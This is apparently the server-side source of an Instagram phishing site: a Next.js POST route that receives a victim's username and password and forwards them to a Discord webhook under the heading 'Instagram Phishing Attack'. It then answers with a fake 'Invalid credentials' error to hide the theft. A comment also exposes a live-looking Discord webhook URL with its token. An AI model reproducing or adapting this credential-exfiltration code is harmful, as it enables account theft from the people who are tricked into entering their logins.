import { NextResponse } from "next/server";
import dotenv from "dotenv"
dotenv.config()

export async function POST(request) {
  const body = await request.json();
  console.log(process.env.WEBHOOK)
  await fetch(
    process.env.WEBHOOK,
    {
      method: "post",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        // the username to be displayed
        username: "webhook",
        // the avatar to be displayed
        avatar_url:
          "https://cdn.discordapp.com/avatars/411256446638882837/9a12fc7810795ded801fdb0401db0be6.png",
        // contents of the message to be sent
        // enable mentioning of individual users or roles, but not @everyone/@here
        allowed_mentions: {
          parse: ["everyone"],
        },
        // embeds to be sent
        embeds: [
          {
            // decimal number colour of the side of the embed
            color: 11730954,
            // author
            // - icon next to text at top (text is a link)
            author: {
              name: "Instagram Phishing Attack",
            },
            // thumbnail
            // - small image in top right corner.
            thumbnail: {
              url: "https://cdn.discordapp.com/avatars/411256446638882837/9a12fc7810795ded801fdb0401db0be6.png",
            },
            // custom embed fields: bold title/name, normal content/value below title
            // - located below description, above image.
            fields: [
              {
                name: "Username",
                value: body.username,
              },
              {
                name: "Password",
                value: body.password,
              },
            ],
          },
        ],
      }),
    }
  );

  await new Promise(resolve => setTimeout(resolve, 500)); // 1000ms = 1 saniye

  return NextResponse.json({ message: 'Invalid credentials' }, { status: 404 });
}
//https://discord.com/api/webhooks/1306939061797388289/iN0TVMDn4VXEfJSl5S795xsaK_HQCEX_QW0fpMNzG3S517frg1pD6hSlbd89CJL5hW9Q

/*
// node.js versions pre-v0.18.0 do not support the fetch api and require a polyfill
// const fetch = require('node-fetch');
fetch(
  'https://discordapp.com/api/webhooks/738983040323289120/mzhXrZz0hqOuUaPUjB_RBTE8XJUFLe8fe9mgeJjQCaxjHX14c3SW3ZR199_CDEI-xT56',
  {
    method: 'post',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      // the username to be displayed
      username: 'webhook',
      // the avatar to be displayed
      avatar_url:
        'https://cdn.discordapp.com/avatars/411256446638882837/9a12fc7810795ded801fdb0401db0be6.png',
      // contents of the message to be sent
      content:
        'user mention: <@279098137484722176>, role mention: <@&496160161459863552>, channel mention: <#508500699458306049>',
      // enable mentioning of individual users or roles, but not @everyone/@here
      allowed_mentions: {
        parse: ['users', 'roles'],
      },
      // embeds to be sent
      embeds: [
        {
          // decimal number colour of the side of the embed
          color: 11730954,
          // author
          // - icon next to text at top (text is a link)
          author: {
            name: 'dragonwocky',
            url: 'https://dragonwocky.me/',
            icon_url: 'https://dragonwocky.me/assets/avatar.jpg',
          },
          // embed title
          // - link on 2nd row
          title: 'title',
          url:
            'https://gist.github.com/dragonwocky/ea61c8d21db17913a43da92efe0de634',
          // thumbnail
          // - small image in top right corner.
          thumbnail: {
            url:
              'https://cdn.discordapp.com/avatars/411256446638882837/9a12fc7810795ded801fdb0401db0be6.png',
          },
          // embed description
          // - text on 3rd row
          description: 'description',
          // custom embed fields: bold title/name, normal content/value below title
          // - located below description, above image.
          fields: [
            {
              name: 'field 1',
              value: 'value',
            },
            {
              name: 'field 2',
              value: 'other value',
            },
          ],
          // image
          // - picture below description(and fields)
          image: {
            url:
              'http://tolkiengateway.net/w/images/thumb/7/75/J.R.R._Tolkien_-_Ring_verse.jpg/300px-J.R.R._Tolkien_-_Ring_verse.jpg',
          },
          // footer
          // - icon next to text at bottom
          footer: {
            text: 'footer',
            icon_url:
              'https://cdn.discordapp.com/avatars/411256446638882837/9a12fc7810795ded801fdb0401db0be6.png',
          },
        },
      ],
    }),
  }
);
*/
